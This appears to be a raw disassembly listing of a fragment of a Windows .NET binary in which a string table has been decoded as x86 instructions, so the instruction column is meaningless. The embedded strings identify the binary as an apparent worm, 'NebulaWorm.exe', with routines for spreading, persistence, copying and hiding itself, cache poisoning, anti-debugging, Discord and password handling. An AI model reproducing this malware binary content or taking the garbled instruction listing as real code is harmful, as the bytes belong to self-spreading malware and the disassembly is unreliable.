  405f3c:	64 00 44 69 73       	add    %al,%fs:0x73(%ecx,%ebp,2)
  405f41:	63 6f 72             	arpl   %ebp,0x72(%edi)
  405f44:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  405f48:	74 5f                	je     0x405fa9
  405f4a:	50                   	push   %eax
  405f4b:	61                   	popa
  405f4c:	73 73                	jae    0x405fc1
  405f4e:	77 6f                	ja     0x405fbf
  405f50:	72 64                	jb     0x405fb6
  405f52:	00 49 73             	add    %cl,0x73(%ecx)
  405f55:	4e                   	dec    %esi
  405f56:	75 6c                	jne    0x405fc4
  405f58:	6c                   	insb   (%dx),%es:(%edi)
  405f59:	4f                   	dec    %edi
  405f5a:	72 57                	jb     0x405fb3
  405f5c:	68 69 74 65 53       	push   $0x53657469
  405f61:	70 61                	jo     0x405fc4
  405f63:	63 65 00             	arpl   %esp,0x0(%ebp)
  405f66:	50                   	push   %eax
  405f67:	65 72 73             	gs jb  0x405fdd
  405f6a:	69 73 74 65 6e 63 65 	imul   $0x65636e65,0x74(%ebx),%esi
  405f71:	00 43 61             	add    %al,0x61(%ebx)
  405f74:	6e                   	outsb  %ds:(%esi),(%dx)
  405f75:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  405f78:	6c                   	insb   (%dx),%es:(%edi)
  405f79:	61                   	popa
  405f7a:	74 69                	je     0x405fe5
  405f7c:	6f                   	outsl  %ds:(%esi),(%dx)
  405f7d:	6e                   	outsb  %ds:(%esi),(%dx)
  405f7e:	54                   	push   %esp
  405f7f:	6f                   	outsl  %ds:(%esi),(%dx)
  405f80:	6b 65 6e 53          	imul   $0x53,0x6e(%ebp),%esp
  405f84:	6f                   	outsl  %ds:(%esi),(%dx)
  405f85:	75 72                	jne    0x405ff9
  405f87:	63 65 00             	arpl   %esp,0x0(%ebp)
  405f8a:	73 6f                	jae    0x405ffb
  405f8c:	75 72                	jne    0x406000
  405f8e:	63 65 00             	arpl   %esp,0x0(%ebp)
  405f91:	43                   	inc    %ebx
  405f92:	6f                   	outsl  %ds:(%esi),(%dx)
  405f93:	70 79                	jo     0x40600e
  405f95:	41                   	inc    %ecx
  405f96:	6e                   	outsb  %ds:(%esi),(%dx)
  405f97:	64 48                	fs dec %eax
  405f99:	69 64 65 00 67 65 74 	imul   $0x5f746567,0x0(%ebp,%eiz,2),%esp
  405fa0:	5f 
  405fa1:	4d                   	dec    %ebp
  405fa2:	65 73 73             	gs jae 0x406018
  405fa5:	61                   	popa
  405fa6:	67 65 00 6d 65       	add    %ch,%gs:0x65(%di)
  405fab:	73 73                	jae    0x406020
  405fad:	61                   	popa
  405fae:	67 65 00 50 6f       	add    %dl,%gs:0x6f(%bx,%si)
  405fb3:	69 73 6f 6e 43 61 63 	imul   $0x6361436e,0x6f(%ebx),%esi
  405fba:	68 65 00 45 6e       	push   $0x6e450065
  405fbf:	75 6d                	jne    0x40602e
  405fc1:	65 72 61             	gs jb  0x406025
  405fc4:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  405fc8:	49                   	dec    %ecx
  405fc9:	44                   	inc    %esp
  405fca:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  405fd1:	6c                   	insb   (%dx),%es:(%edi)
  405fd2:	65 00 64 65 73       	add    %ah,%gs:0x73(%ebp,%eiz,2)
  405fd7:	74 46                	je     0x40601f
  405fd9:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  405fe0:	6e 
  405fe1:	52                   	push   %edx
  405fe2:	6f                   	outsl  %ds:(%esi),(%dx)
  405fe3:	6c                   	insb   (%dx),%es:(%edi)
  405fe4:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  405fe8:	6e                   	outsb  %ds:(%esi),(%dx)
  405fe9:	64 6f                	outsl  %fs:(%esi),(%dx)
  405feb:	77 73                	ja     0x406060
  405fed:	42                   	inc    %edx
  405fee:	75 69                	jne    0x406059
  405ff0:	6c                   	insb   (%dx),%es:(%edi)
  405ff1:	74 49                	je     0x40603c
  405ff3:	6e                   	outsb  %ds:(%esi),(%dx)
  405ff4:	52                   	push   %edx
  405ff5:	6f                   	outsl  %ds:(%esi),(%dx)
  405ff6:	6c                   	insb   (%dx),%es:(%edi)
  405ff7:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405ffb:	6e                   	outsb  %ds:(%esi),(%dx)
  405ffc:	73 6f                	jae    0x40606d
  405ffe:	6c                   	insb   (%dx),%es:(%edi)
  405fff:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  406003:	74 5f                	je     0x406064
  406005:	4d                   	dec    %ebp
  406006:	61                   	popa
  406007:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  40600e:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  406012:	6f                   	outsl  %ds:(%esi),(%dx)
  406013:	63 65 73             	arpl   %esp,0x73(%ebp)
  406016:	73 4d                	jae    0x406065
  406018:	6f                   	outsl  %ds:(%esi),(%dx)
  406019:	64 75 6c             	fs jne 0x406088
  40601c:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  406020:	74 5f                	je     0x406081
  406022:	57                   	push   %edi
  406023:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40602a:	79 6c                	jns    0x406098
  40602c:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  406030:	6f                   	outsl  %ds:(%esi),(%dx)
  406031:	63 65 73             	arpl   %esp,0x73(%ebp)
  406034:	73 57                	jae    0x40608d
  406036:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40603d:	79 6c                	jns    0x4060ab
  40603f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  406043:	74 5f                	je     0x4060a4
  406045:	46                   	inc    %esi
  406046:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40604d:	00 
  40604e:	47                   	inc    %edi
  40604f:	65 6e                	outsb  %gs:(%esi),(%dx)
  406051:	65 72 61             	gs jb  0x4060b5
  406054:	74 65                	je     0x4060bb
  406056:	52                   	push   %edx
  406057:	61                   	popa
  406058:	6e                   	outsb  %ds:(%esi),(%dx)
  406059:	64 6f                	outsl  %fs:(%esi),(%dx)
  40605b:	6d                   	insl   (%dx),%es:(%edi)
  40605c:	46                   	inc    %esi
  40605d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  406064:	00 
  406065:	47                   	inc    %edi
  406066:	65 74 52             	gs je  0x4060bb
  406069:	61                   	popa
  40606a:	6e                   	outsb  %ds:(%esi),(%dx)
  40606b:	64 6f                	outsl  %fs:(%esi),(%dx)
  40606d:	6d                   	insl   (%dx),%es:(%edi)
  40606e:	46                   	inc    %esi
  40606f:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  406076:	00 
  406077:	64 62 67 4e          	bound  %esp,%fs:0x4e(%edi)
  40607b:	61                   	popa
  40607c:	6d                   	insl   (%dx),%es:(%edi)
  40607d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  406081:	74 5f                	je     0x4060e2
  406083:	46                   	inc    %esi
  406084:	75 6c                	jne    0x4060f2
  406086:	6c                   	insb   (%dx),%es:(%edi)
  406087:	4e                   	dec    %esi
  406088:	61                   	popa
  406089:	6d                   	insl   (%dx),%es:(%edi)
  40608a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40608e:	74 5f                	je     0x4060ef
  406090:	50                   	push   %eax
  406091:	72 6f                	jb     0x406102
  406093:	63 65 73             	arpl   %esp,0x73(%ebp)
  406096:	73 4e                	jae    0x4060e6
  406098:	61                   	popa
  406099:	6d                   	insl   (%dx),%es:(%edi)
  40609a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40609e:	74 48                	je     0x4060e8
  4060a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4060a1:	73 74                	jae    0x406117
  4060a3:	4e                   	dec    %esi
  4060a4:	61                   	popa
  4060a5:	6d                   	insl   (%dx),%es:(%edi)
  4060a6:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  4060aa:	67 69 73 74 72 79 4b 	imul   $0x654b7972,0x74(%bp,%di),%esi
  4060b1:	65 
  4060b2:	79 4e                	jns    0x406102
  4060b4:	61                   	popa
  4060b5:	6d                   	insl   (%dx),%es:(%edi)
  4060b6:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4060ba:	74 44                	je     0x406100
  4060bc:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4060c3:	79 4e                	jns    0x406113
  4060c5:	61                   	popa
  4060c6:	6d                   	insl   (%dx),%es:(%edi)
  4060c7:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4060cb:	74 5f                	je     0x40612c
  4060cd:	55                   	push   %ebp
  4060ce:	73 65                	jae    0x406135
  4060d0:	72 6e                	jb     0x406140
  4060d2:	61                   	popa
  4060d3:	6d                   	insl   (%dx),%es:(%edi)
  4060d4:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  4060d9:	65 54                	gs push %esp
  4060db:	69 6d 65 00 52 65 61 	imul   $0x61655200,0x65(%ebp),%ebp
  4060e2:	64 4c                	fs dec %esp
  4060e4:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  4060eb:	74 65                	je     0x406152
  4060ed:	4c                   	dec    %esp
  4060ee:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  4060f5:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  4060f8:	65 00 49 41          	add    %cl,%gs:0x41(%ecx)
  4060fc:	73 79                	jae    0x406177
  4060fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4060ff:	63 53 74             	arpl   %edx,0x74(%ebx)
  406102:	61                   	popa
  406103:	74 65                	je     0x40616a
  406105:	4d                   	dec    %ebp
  406106:	61                   	popa
  406107:	63 68 69             	arpl   %ebp,0x69(%eax)
  40610a:	6e                   	outsb  %ds:(%esi),(%dx)
  40610b:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  40610f:	74 53                	je     0x406164
  406111:	74 61                	je     0x406174
  406113:	74 65                	je     0x40617a
  406115:	4d                   	dec    %ebp
  406116:	61                   	popa
  406117:	63 68 69             	arpl   %ebp,0x69(%eax)
  40611a:	6e                   	outsb  %ds:(%esi),(%dx)
  40611b:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  40611f:	61                   	popa
  406120:	74 65                	je     0x406187
  406122:	4d                   	dec    %ebp
  406123:	61                   	popa
  406124:	63 68 69             	arpl   %ebp,0x69(%eax)
  406127:	6e                   	outsb  %ds:(%esi),(%dx)
  406128:	65 00 4c 6f 63       	add    %cl,%gs:0x63(%edi,%ebp,2)
  40612d:	61                   	popa
  40612e:	6c                   	insb   (%dx),%es:(%edi)
  40612f:	4d                   	dec    %ebp
  406130:	61                   	popa
  406131:	63 68 69             	arpl   %ebp,0x69(%eax)
  406134:	6e                   	outsb  %ds:(%esi),(%dx)
  406135:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  406139:	6e                   	outsb  %ds:(%esi),(%dx)
  40613a:	61                   	popa
  40613b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40613e:	65 6e                	outsb  %gs:(%esi),(%dx)
  406140:	74 53                	je     0x406195
  406142:	63 6f 70             	arpl   %ebp,0x70(%edi)
  406145:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  406149:	6c                   	insb   (%dx),%es:(%edi)
  40614a:	75 65                	jne    0x4061b1
  40614c:	54                   	push   %esp
  40614d:	79 70                	jns    0x4061bf
  40614f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  406153:	74 5f                	je     0x4061b4
  406155:	44                   	inc    %esp
  406156:	72 69                	jb     0x4061c1
  406158:	76 65                	jbe    0x4061bf
  40615a:	54                   	push   %esp
  40615b:	79 70                	jns    0x4061cd
  40615d:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  406161:	73 74                	jae    0x4061d7
  406163:	65 6d                	gs insl (%dx),%es:(%edi)
  406165:	2e 43                	cs inc %ebx
  406167:	6f                   	outsl  %ds:(%esi),(%dx)
  406168:	72 65                	jb     0x4061cf
  40616a:	00 43 61             	add    %al,0x61(%ebx)
  40616d:	70 74                	jo     0x4061e3
  40616f:	75 72                	jne    0x4061e3
  406171:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  406175:	6c                   	insb   (%dx),%es:(%edi)
  406176:	65 61                	gs popa
  406178:	73 65                	jae    0x4061df
  40617a:	00 43 6c             	add    %al,0x6c(%ebx)
  40617d:	6f                   	outsl  %ds:(%esi),(%dx)
  40617e:	73 65                	jae    0x4061e5
  406180:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  406184:	70 6f                	jo     0x4061f5
  406186:	73 65                	jae    0x4061ed
  406188:	00 43 72             	add    %al,0x72(%ebx)
  40618b:	65 61                	gs popa
  40618d:	74 65                	je     0x4061f4
  40618f:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  406192:	31 5f 5f             	xor    %ebx,0x5f(%edi)
  406195:	73 74                	jae    0x40620b
  406197:	61                   	popa
  406198:	74 65                	je     0x4061ff
  40619a:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  40619e:	65 74 65             	gs je  0x406206
  4061a1:	00 53 61             	add    %dl,0x61(%ebx)
  4061a4:	66 65 43             	gs inc %bx
  4061a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4061a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4061a9:	73 6f                	jae    0x40621a
  4061ab:	6c                   	insb   (%dx),%es:(%edi)
  4061ac:	65 57                	gs push %edi
  4061ae:	72 69                	jb     0x406219
  4061b0:	74 65                	je     0x406217
  4061b2:	00 53 54             	add    %dl,0x54(%ebx)
  4061b5:	41                   	inc    %ecx
  4061b6:	54                   	push   %esp
  4061b7:	68 72 65 61 64       	push   $0x64616572
  4061bc:	41                   	inc    %ecx
  4061bd:	74 74                	je     0x406233
  4061bf:	72 69                	jb     0x40622a
  4061c1:	62 75 74             	bound  %esi,0x74(%ebp)
  4061c4:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4061c8:	6d                   	insl   (%dx),%es:(%edi)
  4061c9:	70 69                	jo     0x406234
  4061cb:	6c                   	insb   (%dx),%es:(%edi)
  4061cc:	65 72 47             	gs jb  0x406216
  4061cf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4061d1:	65 72 61             	gs jb  0x406235
  4061d4:	74 65                	je     0x40623b
  4061d6:	64 41                	fs inc %ecx
  4061d8:	74 74                	je     0x40624e
  4061da:	72 69                	jb     0x406245
  4061dc:	62 75 74             	bound  %esi,0x74(%ebp)
  4061df:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  4061e3:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  4061ea:	62 
  4061eb:	75 74                	jne    0x406261
  4061ed:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  4061f1:	76 65                	jbe    0x406258
  4061f3:	72 69                	jb     0x40625e
  4061f5:	66 69 61 62 6c 65    	imul   $0x656c,0x62(%ecx),%sp
  4061fb:	43                   	inc    %ebx
  4061fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4061fd:	64 65 41             	fs gs inc %ecx
  406200:	74 74                	je     0x406276
  406202:	72 69                	jb     0x40626d
  406204:	62 75 74             	bound  %esi,0x74(%ebp)
  406207:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40620c:	75 67                	jne    0x406275
  40620e:	67 61                	addr16 popa
  406210:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  406214:	74 74                	je     0x40628a
  406216:	72 69                	jb     0x406281
  406218:	62 75 74             	bound  %esi,0x74(%ebp)
  40621b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40621f:	6d                   	insl   (%dx),%es:(%edi)
  406220:	56                   	push   %esi
  406221:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  406228:	74 74                	je     0x40629e
  40622a:	72 69                	jb     0x406295
  40622c:	62 75 74             	bound  %esi,0x74(%ebp)
  40622f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406233:	73 65                	jae    0x40629a
  406235:	6d                   	insl   (%dx),%es:(%edi)
  406236:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40623a:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  406241:	72 
  406242:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  406249:	73 79                	jae    0x4062c4
  40624b:	6e                   	outsb  %ds:(%esi),(%dx)
  40624c:	63 53 74             	arpl   %edx,0x74(%ebx)
  40624f:	61                   	popa
  406250:	74 65                	je     0x4062b7
  406252:	4d                   	dec    %ebp
  406253:	61                   	popa
  406254:	63 68 69             	arpl   %ebp,0x69(%eax)
  406257:	6e                   	outsb  %ds:(%esi),(%dx)
  406258:	65 41                	gs inc %ecx
  40625a:	74 74                	je     0x4062d0
  40625c:	72 69                	jb     0x4062c7
  40625e:	62 75 74             	bound  %esi,0x74(%ebp)
  406261:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406265:	73 65                	jae    0x4062cc
  406267:	6d                   	insl   (%dx),%es:(%edi)
  406268:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40626c:	72 61                	jb     0x4062cf
  40626e:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  406271:	61                   	popa
  406272:	72 6b                	jb     0x4062df
  406274:	41                   	inc    %ecx
  406275:	74 74                	je     0x4062eb
  406277:	72 69                	jb     0x4062e2
  406279:	62 75 74             	bound  %esi,0x74(%ebp)
  40627c:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  406281:	67 65 74 46          	addr16 gs je 0x4062cb
  406285:	72 61                	jb     0x4062e8
  406287:	6d                   	insl   (%dx),%es:(%edi)
  406288:	65 77 6f             	gs ja  0x4062fa
  40628b:	72 6b                	jb     0x4062f8
  40628d:	41                   	inc    %ecx
  40628e:	74 74                	je     0x406304
  406290:	72 69                	jb     0x4062fb
  406292:	62 75 74             	bound  %esi,0x74(%ebp)
  406295:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40629a:	75 67                	jne    0x406303
  40629c:	67 65 72 48          	addr16 gs jb 0x4062e8
  4062a0:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  4062a7:	74 
  4062a8:	72 69                	jb     0x406313
  4062aa:	62 75 74             	bound  %esi,0x74(%ebp)
  4062ad:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4062b1:	73 65                	jae    0x406318
  4062b3:	6d                   	insl   (%dx),%es:(%edi)
  4062b4:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4062b8:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4062bf:	69 
  4062c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4062c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4062c2:	41                   	inc    %ecx
  4062c3:	74 74                	je     0x406339
  4062c5:	72 69                	jb     0x406330
  4062c7:	62 75 74             	bound  %esi,0x74(%ebp)
  4062ca:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  4062ce:	63 75 72             	arpl   %esi,0x72(%ebp)
  4062d1:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  4062d8:	69 
  4062d9:	73 73                	jae    0x40634e
  4062db:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4062e2:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4062e9:	73 73                	jae    0x40635e
  4062eb:	65 6d                	gs insl (%dx),%es:(%edi)
  4062ed:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4062f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4062f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4062f3:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4062f9:	74 69                	je     0x406364
  4062fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4062fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4062fd:	41                   	inc    %ecx
  4062fe:	74 74                	je     0x406374
  406300:	72 69                	jb     0x40636b
  406302:	62 75 74             	bound  %esi,0x74(%ebp)
  406305:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406309:	73 65                	jae    0x406370
  40630b:	6d                   	insl   (%dx),%es:(%edi)
  40630c:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  406310:	65 73 63             	gs jae 0x406376
  406313:	72 69                	jb     0x40637e
  406315:	70 74                	jo     0x40638b
  406317:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40631e:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  406325:	6f                   	outsl  %ds:(%esi),(%dx)
  406326:	6d                   	insl   (%dx),%es:(%edi)
  406327:	70 69                	jo     0x406392
  406329:	6c                   	insb   (%dx),%es:(%edi)
  40632a:	61                   	popa
  40632b:	74 69                	je     0x406396
  40632d:	6f                   	outsl  %ds:(%esi),(%dx)
  40632e:	6e                   	outsb  %ds:(%esi),(%dx)
  40632f:	52                   	push   %edx
  406330:	65 6c                	gs insb (%dx),%es:(%edi)
  406332:	61                   	popa
  406333:	78 61                	js     0x406396
  406335:	74 69                	je     0x4063a0
  406337:	6f                   	outsl  %ds:(%esi),(%dx)
  406338:	6e                   	outsb  %ds:(%esi),(%dx)
  406339:	73 41                	jae    0x40637c
  40633b:	74 74                	je     0x4063b1
  40633d:	72 69                	jb     0x4063a8
  40633f:	62 75 74             	bound  %esi,0x74(%ebp)
  406342:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406346:	73 65                	jae    0x4063ad
  406348:	6d                   	insl   (%dx),%es:(%edi)
  406349:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40634d:	72 6f                	jb     0x4063be
  40634f:	64 75 63             	fs jne 0x4063b5
  406352:	74 41                	je     0x406395
  406354:	74 74                	je     0x4063ca
  406356:	72 69                	jb     0x4063c1
  406358:	62 75 74             	bound  %esi,0x74(%ebp)
  40635b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40635f:	73 65                	jae    0x4063c6
  406361:	6d                   	insl   (%dx),%es:(%edi)
  406362:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406366:	6f                   	outsl  %ds:(%esi),(%dx)
  406367:	70 79                	jo     0x4063e2
  406369:	72 69                	jb     0x4063d4
  40636b:	67 68 74 41 74 74    	addr16 push $0x74744174
  406371:	72 69                	jb     0x4063dc
  406373:	62 75 74             	bound  %esi,0x74(%ebp)
  406376:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40637a:	73 65                	jae    0x4063e1
  40637c:	6d                   	insl   (%dx),%es:(%edi)
  40637d:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406381:	6f                   	outsl  %ds:(%esi),(%dx)
  406382:	6d                   	insl   (%dx),%es:(%edi)
  406383:	70 61                	jo     0x4063e6
  406385:	6e                   	outsb  %ds:(%esi),(%dx)
  406386:	79 41                	jns    0x4063c9
  406388:	74 74                	je     0x4063fe
  40638a:	72 69                	jb     0x4063f5
  40638c:	62 75 74             	bound  %esi,0x74(%ebp)
  40638f:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  406393:	6e                   	outsb  %ds:(%esi),(%dx)
  406394:	74 69                	je     0x4063ff
  406396:	6d                   	insl   (%dx),%es:(%edi)
  406397:	65 43                	gs inc %ebx
  406399:	6f                   	outsl  %ds:(%esi),(%dx)
  40639a:	6d                   	insl   (%dx),%es:(%edi)
  40639b:	70 61                	jo     0x4063fe
  40639d:	74 69                	je     0x406408
  40639f:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4063a2:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4063a9:	69 
  4063aa:	62 75 74             	bound  %esi,0x74(%ebp)
  4063ad:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4063b1:	74 5f                	je     0x406412
  4063b3:	55                   	push   %ebp
  4063b4:	73 65                	jae    0x40641b
  4063b6:	53                   	push   %ebx
  4063b7:	68 65 6c 6c 45       	push   $0x456c6c65
  4063bc:	78 65                	js     0x406423
  4063be:	63 75 74             	arpl   %esi,0x74(%ebp)
  4063c1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4063c5:	74 5f                	je     0x406426
  4063c7:	56                   	push   %esi
  4063c8:	61                   	popa
  4063c9:	6c                   	insb   (%dx),%es:(%edi)
  4063ca:	75 65                	jne    0x406431
  4063cc:	00 47 65             	add    %al,0x65(%edi)
  4063cf:	74 56                	je     0x406427
  4063d1:	61                   	popa
  4063d2:	6c                   	insb   (%dx),%es:(%edi)
  4063d3:	75 65                	jne    0x40643a
  4063d5:	00 53 65             	add    %dl,0x65(%ebx)
  4063d8:	74 56                	je     0x406430
  4063da:	61                   	popa
  4063db:	6c                   	insb   (%dx),%es:(%edi)
  4063dc:	75 65                	jne    0x406443
  4063de:	00 49 73             	add    %cl,0x73(%ecx)
  4063e1:	48                   	dec    %eax
  4063e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4063e3:	73 74                	jae    0x406459
  4063e5:	41                   	inc    %ecx
  4063e6:	6c                   	insb   (%dx),%es:(%edi)
  4063e7:	69 76 65 00 74 61 72 	imul   $0x72617400,0x65(%esi),%esi
  4063ee:	67 65 74 45          	addr16 gs je 0x406437
  4063f2:	78 65                	js     0x406459
  4063f4:	00 4e 65             	add    %cl,0x65(%esi)
  4063f7:	62 75 6c             	bound  %esi,0x6c(%ebp)
  4063fa:	61                   	popa
  4063fb:	57                   	push   %edi
  4063fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4063fd:	72 6d                	jb     0x40646c
  4063ff:	2e 65 78 65          	cs js,pn 0x406468
  406403:	00 50 69             	add    %dl,0x69(%eax)
  406406:	6e                   	outsb  %ds:(%esi),(%dx)
  406407:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  40640b:	73 74                	jae    0x406481
  40640d:	65 6d                	gs insl (%dx),%es:(%edi)
  40640f:	2e 54                	cs push %esp
  406411:	68 72 65 61 64       	push   $0x64616572
  406416:	69 6e 67 00 53 74 6f 	imul   $0x6f745300,0x67(%esi),%ebp
  40641d:	70 53                	jo     0x406472
  40641f:	70 72                	jo     0x406493
  406421:	65 61                	gs popa
  406423:	64 69 6e 67 00 53 74 	imul   $0x61745300,%fs:0x67(%esi),%ebp
  40642a:	61 
  40642b:	72 74                	jb     0x4064a1
  40642d:	53                   	push   %ebx
  40642e:	70 72                	jo     0x4064a2
  406430:	65 61                	gs popa
  406432:	64 69 6e 67 00 45 6e 	imul   $0x636e4500,%fs:0x67(%esi),%ebp
  406439:	63 
  40643a:	6f                   	outsl  %ds:(%esi),(%dx)
  40643b:	64 69 6e 67 00 49 73 	imul   $0x4c734900,%fs:0x67(%esi),%ebp
  406442:	4c 
  406443:	6f                   	outsl  %ds:(%esi),(%dx)
  406444:	67 67 69 6e 67 00 69 	addr16 imul $0x52736900,0x67(%bp),%ebp
  40644b:	73 52 
  40644d:	75 6e                	jne    0x4064bd
  40644f:	6e                   	outsb  %ds:(%esi),(%dx)
  406450:	69 6e 67 00 49 73 44 	imul   $0x44734900,0x67(%esi),%ebp
  406457:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40645b:	67 65 72 50          	addr16 gs jb 0x4064af
  40645f:	72 6f                	jb     0x4064d0
  406461:	63 65 73             	arpl   %esp,0x73(%ebp)
  406464:	73 52                	jae    0x4064b8
  406466:	75 6e                	jne    0x4064d6
  406468:	6e                   	outsb  %ds:(%esi),(%dx)
  406469:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  406470:	74 65                	je     0x4064d7
  406472:	6d                   	insl   (%dx),%es:(%edi)
  406473:	2e 52                	cs push %edx
  406475:	75 6e                	jne    0x4064e5
  406477:	74 69                	je     0x4064e2
  406479:	6d                   	insl   (%dx),%es:(%edi)
  40647a:	65 2e 56             	gs cs push %esi
  40647d:	65 72 73             	gs jb  0x4064f3
  406480:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  406487:	54                   	push   %esp
  406488:	6f                   	outsl  %ds:(%esi),(%dx)
  406489:	53                   	push   %ebx
  40648a:	74 72                	je     0x4064fe
  40648c:	69 6e 67 00 41 6e 74 	imul   $0x746e4100,0x67(%esi),%ebp
  406493:	69 44 65 62 75 67 00 	imul   $0x53006775,0x62(%ebp,%eiz,2),%eax
  40649a:	53 
  40649b:	74 6f                	je     0x40650c
  40649d:	70 77                	jo     0x406516
  40649f:	61                   	popa
  4064a0:	74 63                	je     0x406505
  4064a2:	68 00 73 65 74       	push   $0x74657300
  4064a7:	5f                   	pop    %edi
  4064a8:	41                   	inc    %ecx
  4064a9:	75 74                	jne    0x40651f
  4064ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4064ac:	46                   	inc    %esi
  4064ad:	6c                   	insb   (%dx),%es:(%edi)
  4064ae:	75 73                	jne    0x406523
  4064b0:	68 00 47 65 74       	push   $0x74654700
